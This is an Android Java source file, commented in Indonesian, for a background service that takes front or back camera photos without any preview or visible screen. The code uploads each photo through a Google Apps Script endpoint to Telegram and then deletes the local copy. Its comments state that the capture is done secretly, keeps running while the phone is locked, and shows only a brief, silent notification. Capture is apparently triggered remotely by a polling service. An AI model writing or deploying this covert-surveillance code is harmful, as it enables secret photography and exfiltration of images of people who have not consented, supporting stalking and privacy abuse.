package com.example.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageCapture;
import androidx.camera.core.ImageCaptureException;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.core.content.ContextCompat;
import androidx.lifecycle.Lifecycle;
import androidx.lifecycle.LifecycleOwner;
import androidx.lifecycle.LifecycleRegistry;

import com.google.common.util.concurrent.ListenableFuture;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Mengambil foto kamera secara diam-diam di latar belakang.
 *
 * Tidak ada UI, tidak ada layar yang terbuka.
 * Alur: kamera aktif → tunggu stabilisasi → foto diambil otomatis
 *       → upload ke GAS → GAS kirim ke Telegram → service berhenti.
 *
 * Berjalan sebagai Foreground Service sehingga tetap aktif meski
 * app di-minimize atau HP dikunci. Notifikasi "Mengambil foto..."
 * muncul sebentar di status bar lalu hilang saat selesai.
 *
 * Catatan AndroidManifest yang wajib ditambahkan:
 *
 *   <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
 *   <!-- Android 14+ -->
 *   <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
 *
 *   <service
 *       android:name=".CameraService"
 *       android:exported="false"
 *       android:foregroundServiceType="camera"/>
 */
public class CameraService extends Service implements LifecycleOwner {

    private static final String TAG              = "CameraService";
    private static final String CHANNEL_ID       = "camera_capture";
    private static final int    NOTIFICATION_ID  = 3001;
    private static final long   CAPTURE_DELAY_MS = 800L;

    public static final String EXTRA_REQUEST_ID = "requestId";
    public static final String EXTRA_CAMERA     = "camera";

    private LifecycleRegistry  lifecycleRegistry;
    private ExecutorService    cameraExecutor;
    private ImageCapture       imageCapture;

    private String  requestId;
    private String  requestedCamera = "front";
    private boolean useFrontCamera  = true;

    // =========================================================
    // LIFECYCLE SERVICE
    // =========================================================

    @Override
    public void onCreate() {
        super.onCreate();
        lifecycleRegistry = new LifecycleRegistry(this);
        lifecycleRegistry.setCurrentState(Lifecycle.State.CREATED);
        cameraExecutor = Executors.newSingleThreadExecutor();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        if (intent != null) {
            requestId = intent.getStringExtra(EXTRA_REQUEST_ID);
            String camera = intent.getStringExtra(EXTRA_CAMERA);
            if ("back".equalsIgnoreCase(camera)) {
                requestedCamera = "back";
                useFrontCamera  = false;
            } else {
                requestedCamera = "front";
                useFrontCamera  = true;
            }
        }

        // Wajib jadi foreground service agar OS tidak matikan
        // saat kamera sedang aktif di background
        startForeground(NOTIFICATION_ID, buildNotification());

        lifecycleRegistry.setCurrentState(Lifecycle.State.STARTED);
        lifecycleRegistry.setCurrentState(Lifecycle.State.RESUMED);

        startCameraAndCapture();

        // START_NOT_STICKY: tidak perlu restart otomatis —
        // CameraPollingService yang akan trigger lagi bila perlu
        return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        lifecycleRegistry.setCurrentState(Lifecycle.State.DESTROYED);
        if (cameraExecutor != null) {
            cameraExecutor.shutdown();
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @NonNull
    @Override
    public Lifecycle getLifecycle() {
        return lifecycleRegistry;
    }

    // =========================================================
    // KAMERA
    // =========================================================

    private void startCameraAndCapture() {

        ListenableFuture<ProcessCameraProvider> future =
                ProcessCameraProvider.getInstance(this);

        future.addListener(() -> {

            try {
                ProcessCameraProvider cameraProvider = future.get();

                CameraSelector selector = useFrontCamera
                        ? CameraSelector.DEFAULT_FRONT_CAMERA
                        : CameraSelector.DEFAULT_BACK_CAMERA;

                if (!cameraProvider.hasCamera(selector)) {
                    Log.e(TAG, "Kamera " + requestedCamera + " tidak tersedia");
                    cancelRequest();
                    return;
                }

                // Hanya ImageCapture, tanpa Preview —
                // tidak ada tampilan apapun ke pengguna
                imageCapture = new ImageCapture.Builder()
                        .setCaptureMode(
                                ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY
                        )
                        .build();

                cameraProvider.unbindAll();
                cameraProvider.bindToLifecycle(
                        this, selector, imageCapture
                );

                // Tunggu kamera stabil sebelum ambil foto
                new Handler(Looper.getMainLooper()).postDelayed(
                        this::takePhoto,
                        CAPTURE_DELAY_MS
                );

            } catch (Exception e) {
                Log.e(TAG, "Gagal membuka kamera", e);
                cancelRequest();
            }

        }, ContextCompat.getMainExecutor(this));
    }

    // =========================================================
    // AMBIL FOTO (otomatis)
    // =========================================================

    private void takePhoto() {

        if (imageCapture == null) {
            cancelRequest();
            return;
        }

        File outputDir = new File(getCacheDir(), "camera");
        if (!outputDir.exists() && !outputDir.mkdirs()) {
            Log.e(TAG, "Gagal membuat direktori cache kamera");
            cancelRequest();
            return;
        }

        String timestamp = new SimpleDateFormat(
                "yyyyMMdd_HHmmss_SSS", Locale.US
        ).format(new Date());

        File photoFile = new File(outputDir, "IMG_" + timestamp + ".jpg");

        ImageCapture.OutputFileOptions outputOptions =
                new ImageCapture.OutputFileOptions
                        .Builder(photoFile)
                        .build();

        imageCapture.takePicture(
                outputOptions,
                ContextCompat.getMainExecutor(this),
                new ImageCapture.OnImageSavedCallback() {

                    @Override
                    public void onImageSaved(
                            @NonNull ImageCapture.OutputFileResults results) {
                        Log.d(TAG, "Foto tersimpan: " + photoFile.getName());
                        uploadPhoto(photoFile);
                    }

                    @Override
                    public void onError(
                            @NonNull ImageCaptureException exception) {
                        Log.e(TAG, "Gagal ambil foto", exception);
                        cancelRequest();
                    }
                }
        );
    }

    // =========================================================
    // UPLOAD & SELESAI
    // =========================================================

    private void uploadPhoto(File photo) {

        final String currentRequestId = requestId;
        final String currentCamera    = requestedCamera;

        if (currentRequestId == null ||
                currentRequestId.trim().isEmpty()) {
            cleanupAndStop(photo);
            return;
        }

        new Thread(() -> {

            boolean uploaded = ApiHelper.uploadCapturedPhoto(
                    currentRequestId,
                    currentCamera,
                    photo
            );

            ApiHelper.updateCameraRequestStatus(
                    currentRequestId,
                    uploaded ? "COMPLETED" : "UPLOAD_FAILED"
            );

            Log.d(TAG, uploaded ? "Upload berhasil" : "Upload gagal");
            cleanupAndStop(photo);

        }).start();
    }

    // =========================================================
    // CANCEL & CLEANUP
    // =========================================================

    private void cancelRequest() {
        final String id = requestId;
        if (id != null && !id.trim().isEmpty()) {
            new Thread(() ->
                    ApiHelper.updateCameraRequestStatus(id, "CANCELLED")
            ).start();
        }
        stopSelf();
    }

    private void cleanupAndStop(File file) {
        if (file != null && file.exists()) {
            if (!file.delete()) file.deleteOnExit();
        }
        stopSelf();
    }

    // =========================================================
    // NOTIFIKASI (wajib untuk foreground service)
    // =========================================================

    private Notification buildNotification() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Kamera",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setShowBadge(false);
            channel.setSound(null, null);
            NotificationManager nm =
                    getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }

        Notification.Builder builder =
                new Notification.Builder(this, CHANNEL_ID)
                        .setContentTitle("Mengambil foto...")
                        .setSmallIcon(android.R.drawable.ic_menu_camera)
                        .setOngoing(true);

        return builder.build();
    }

    // =========================================================
    // HELPER STATIS
    // =========================================================

    /**
     * Mulai CameraService dari mana saja (MainActivity,
     * CameraPollingService, dll).
     */
    public static void start(
            Context context,
            String requestId,
            String camera) {

        Intent intent = new Intent(context, CameraService.class);
        intent.putExtra(EXTRA_REQUEST_ID, requestId);
        intent.putExtra(EXTRA_CAMERA, camera);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }
}
